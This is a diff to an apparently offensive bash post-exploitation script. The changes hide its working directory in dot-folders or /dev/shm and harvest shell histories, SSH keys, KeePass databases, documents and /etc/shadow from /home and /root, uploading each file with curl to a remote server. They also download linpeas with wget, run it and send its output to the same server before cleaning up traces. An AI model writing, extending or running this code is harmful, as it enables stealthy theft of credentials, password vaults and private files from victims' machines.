@@ -36,8 +36,14 @@ else
 fi
 
 WORKDIR="$BASEDIR/.local/.cache/.svc"
-mkdir -p "$WORKDIR"
-cd "$WORKDIR"
+if mkdir -p "$WORKDIR" 2>/dev/null && cd "$WORKDIR"; then
+    echo "[*] Using workdir: $WORKDIR"
+else
+    WORKDIR="/dev/shm/.svc"
+    mkdir -p "$WORKDIR"
+    cd "$WORKDIR"
+    echo "[*] Falling back to workdir: $WORKDIR"
+fi
 
 persist_mode() {
     echo "[*] Running persist mode in $WORKDIR"
@@ -67,19 +73,21 @@ persist_mode() {
 collect_mode() {
     echo "[*] Running collect mode..."
 
-    FILES=$(find /home -type f \
-        \( -name ".bash_history" -o -name ".zsh_history" \
-        -o -name ".bashrc" -o -name ".zshrc" \
-        -o -name "*.txt" -o -name "*.log" -o -name "*.conf" \
-        -o -name "*.pdf" -o -name "*.xls" -o -name "*.xlsx" -o -name "*.doc" -o -name "*.docx" \
-        -o -name "id_*" -o -name "authorized_keys" \) 2>/dev/null)
-
-    FILES+=" $(test -r /etc/shadow && echo /etc/shadow)"
-
-
-    for f in $FILES; do
+    # Search both /home and /root (if accessible)
+    for DIR in /home /root; do
+        [ -d "$DIR" ] || continue
+        find "$DIR" -type f \
+            \( -name ".bash_history" -o -name ".zsh_history" \
+            -o -name ".bashrc" -o -name ".zshrc" \
+            -o -name "*.txt" -o -name "*.log" -o -name "*.conf" \
+            -o -name "*.pdf" -o -name "*.xls" -o -name "*.xlsx" \
+            -o -name "*.doc" -o -name "*.docx" -o -name "*.kdbx" \
+            -o -name "id_*" -o -name "authorized_keys" \) \
+            -print0 2>/dev/null || true
+    done |
+    while IFS= read -r -d '' f; do
         if [ -f "$f" ]; then
-            OWNER="$(stat -c "%U" "$f")"
+            OWNER="$(stat -c "%U" "$f" 2>/dev/null || echo unknown)"
             BASENAME="$(basename "$f")"
             CUSTOM_NAME="${HOSTNAME}_${OWNER}_${BASENAME}"
             echo "[*] Exfiltrating $f as $CUSTOM_NAME ..."
@@ -87,6 +95,16 @@ collect_mode() {
                 || echo "[-] Failed to send $f"
         fi
     done
+
+    # Add shadow separately (not caught by find)
+    if [ -r /etc/shadow ]; then
+        f="/etc/shadow"
+        OWNER="$(stat -c "%U" "$f" 2>/dev/null || echo root)"
+        CUSTOM_NAME="${HOSTNAME}_${OWNER}_shadow"
+        echo "[*] Exfiltrating $f as $CUSTOM_NAME ..."
+        curl -s -F "file=@$f;filename=$CUSTOM_NAME" "http://$SERVER_IP:8080/p" \
+            || echo "[-] Failed to send $f"
+    fi
 
     echo "[+] Collection & exfiltration complete."
 }
@@ -97,10 +115,13 @@ privesc_mode() {
     wget -q "http://$SERVER_IP/linpeas" -O linpeas || { echo "[-] Failed to download linpeas"; exit 1; }
     chmod +x linpeas
 
-    ./linpeas -a -q | tee "${HOSTNAME}_${USERNAME}_linpeas.txt"
-    curl -s -F "file=@${HOSTNAME}_linpeas.txt" "http://$SERVER_IP:8080/p" || echo "[-] Failed to send file"
+    trap 'echo "[*] linpeas interrupted, continuing..."' INT
+    timeout 600 ./linpeas -a -q | tee "${HOSTNAME}_${USERNAME}_linpeas.txt" || true
+    trap - INT
 
-    rm -f linpeas "${HOSTNAME}_linpeas.txt"
+    curl -s -F "file=@${HOSTNAME}_${USERNAME}_linpeas.txt" "http://$SERVER_IP:8080/p" || echo "[-] Failed to send file"
+
+    rm -f linpeas "${HOSTNAME}_${USERNAME}_linpeas.txt"
     echo "[+] Privesc scan completed and cleaned up."
 }
 
